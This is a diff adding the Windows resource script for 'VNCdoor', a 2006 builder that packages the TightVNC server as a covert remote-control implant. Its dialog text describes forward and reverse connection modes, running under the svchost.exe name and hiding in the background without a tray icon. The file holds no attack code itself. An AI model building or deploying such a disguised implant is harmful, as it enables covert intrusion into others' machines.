@@ -1,0 +1,289 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// Chinese (P.R.C.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\VNCdoor.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\VNCdoor.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_ABOUTBOX DIALOG DISCARDABLE  0, 0, 235, 55
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "关于 VNCdoor"
+FONT 9, "宋体"
+BEGIN
+    ICON            IDR_MAINFRAME,IDC_STATIC,11,17,20,20
+    LTEXT           "VNCdoor 1.0 版",IDC_STATIC,40,10,119,8,SS_NOPREFIX
+    LTEXT           "版权所有 (C) 2006",IDC_STATIC,40,25,119,8
+    DEFPUSHBUTTON   "确定",IDOK,178,7,50,14,WS_GROUP
+END
+
+IDD_VNCDOOR_DIALOG DIALOGEX 0, 0, 167, 198
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_VISIBLE | WS_CAPTION | 
+    WS_SYSMENU
+EXSTYLE WS_EX_ACCEPTFILES | WS_EX_CLIENTEDGE | WS_EX_APPWINDOW
+CAPTION "VNCdoor  By:天涯浪人 "
+FONT 9, "新宋体"
+BEGIN
+    DEFPUSHBUTTON   "说 明",IDOK,17,174,50,14
+    PUSHBUTTON      "退 出",IDCANCEL,100,174,50,14
+    CONTROL         " 正 向 连 接 型",IDC_STATIC,"Static",SS_LEFTNOWORDWRAP | 
+                    SS_NOTIFY | SS_CENTERIMAGE | SS_SUNKEN | WS_GROUP,52,4,
+                    67,14,WS_EX_DLGMODALFRAME
+    LTEXT           "连接密码:",IDC_STATIC,20,57,37,8
+    GROUPBOX        "设置:",IDC_STATIC,16,21,95,57
+    PUSHBUTTON      "生 成",IDC_BUTTON1,115,29,33,14
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKFRAME,14,86,137,4
+    PUSHBUTTON      "控 制",IDC_BUTTON2,115,56,33,14
+    LTEXT           "连接端口:",IDC_STATIC,20,33,37,8
+    LTEXT           "反弹端口:",IDC_STATIC,20,146,37,8
+    EDITTEXT        IDC_EDIT3,58,119,50,14,ES_AUTOHSCROLL
+    GROUPBOX        "设置:",IDC_STATIC,16,110,95,57
+    PUSHBUTTON      "生 成",IDC_BUTTON3,115,118,33,14
+    PUSHBUTTON      "监 听",IDC_BUTTON4,115,145,33,14
+    LTEXT           "反弹IP:",IDC_STATIC,20,122,29,8
+    EDITTEXT        IDC_EDIT4,58,146,50,14,ES_AUTOHSCROLL
+    CONTROL         " 反 向 连 接 型",IDC_STATIC,"Static",SS_LEFTNOWORDWRAP | 
+                    SS_NOTIFY | SS_CENTERIMAGE | SS_SUNKEN | WS_GROUP,52,94,
+                    67,14,WS_EX_DLGMODALFRAME
+    EDITTEXT        IDC_EDIT1,58,30,50,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_EDIT2,58,55,50,14,ES_AUTOHSCROLL
+END
+
+IDD_DIALOG1 DIALOGEX 0, 0, 178, 231
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "VNCdoor  说明文档"
+FONT 9, "宋体", 0, 0, 0x1
+BEGIN
+    CONTROL         " VNCdoor 生成器",IDC_STATIC,"Static",SS_LEFTNOWORDWRAP | 
+                    SS_CENTERIMAGE | SS_SUNKEN,53,6,67,13,
+                    WS_EX_DLGMODALFRAME
+    LTEXT           "被控端:封装了TightVNC 1.2.9的服务端",IDC_STATIC,16,29,
+                    144,8
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKFRAME,10,23,157,200
+    LTEXT           "只有一个文件,无多余dll,可以自定义",IDC_STATIC,16,39,144,
+                    8
+    LTEXT           "端口号和连接密码。",IDC_STATIC,16,49,144,8
+    LTEXT           "以svchost.exe执行各项功能。",IDC_STATIC,16,79,144,8
+    LTEXT           "不写注册表进行设置,端口号和密码直接",IDC_STATIC,16,59,
+                    144,8
+    LTEXT           "从封装的被控端读取。",IDC_STATIC,16,69,144,8
+    LTEXT           "不显示托盘图标.后台隐藏运行。",IDC_STATIC,16,89,144,8
+    LTEXT           "控制端:TightVNC 1.2.9汉化版,只汉化",IDC_STATIC,16,99,
+                    144,8
+    LTEXT           "TightVNC版权归原公司所有，该生成器",IDC_STATIC,18,129,
+                    139,8
+    CONTROL         "",IDC_STATIC,"Static",SS_BLACKFRAME,16,125,143,54
+    LTEXT           "仅做学习之用，请勿用于非法用途，本",IDC_STATIC,18,139,
+                    139,8
+    LTEXT           "人无法保证该工具不会对您的系统造成",IDC_STATIC,18,149,
+                    139,8
+    LTEXT           "损害，请使用者自己承担一切后果，",IDC_STATIC,17,160,139,
+                    8
+    LTEXT           "否则请勿尝试运行!",IDC_STATIC,17,169,139,8
+    LTEXT           "╔──────────╗ ",IDC_STATIC,41,181,99,8
+    LTEXT           "│      天涯浪人      │",IDC_STATIC,41,189,99,8
+    LTEXT           "│     QQ:6354365     │ ",IDC_STATIC,41,197,97,8
+    LTEXT           "│ Email:tmya@163.com │",IDC_STATIC,41,205,102,8
+    LTEXT           "╚──────────╝",IDC_STATIC,41,213,99,8
+    LTEXT           "了连接对话框，嘿嘿",IDC_STATIC,16,109,144,8
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404B0"
+        BEGIN
+            VALUE "CompanyName", "\0"
+            VALUE "FileDescription", "VNCdoor Microsoft 基础类应用程序\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "VNCdoor\0"
+            VALUE "LegalCopyright", "版权所有 (C) 2006\0"
+            VALUE "LegalTrademarks", "\0"
+            VALUE "OriginalFilename", "VNCdoor.EXE\0"
+            VALUE "ProductName", "VNCdoor 应用程序\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_ABOUTBOX, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 228
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 48
+    END
+
+    IDD_VNCDOOR_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 160
+        TOPMARGIN, 1
+        BOTTOMMARGIN, 191
+    END
+
+    IDD_DIALOG1, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 171
+        TOPMARGIN, 5
+        BOTTOMMARGIN, 226
+        HORZGUIDE, 159
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// SERV
+//
+
+IDR_SERV1               SERV    DISCARDABLE     "res\\VNCserver.exe"
+IDR_SERV2               SERV    DISCARDABLE     "res\\ReVserver.exe"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// CLIENT
+//
+
+IDR_CLIENT1             CLIENT  DISCARDABLE     "res\\vncviewer.exe"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDS_ABOUTBOX            "关于 VNCdoor(&A)..."
+END
+
+#endif    // Chinese (P.R.C.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\VNCdoor.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
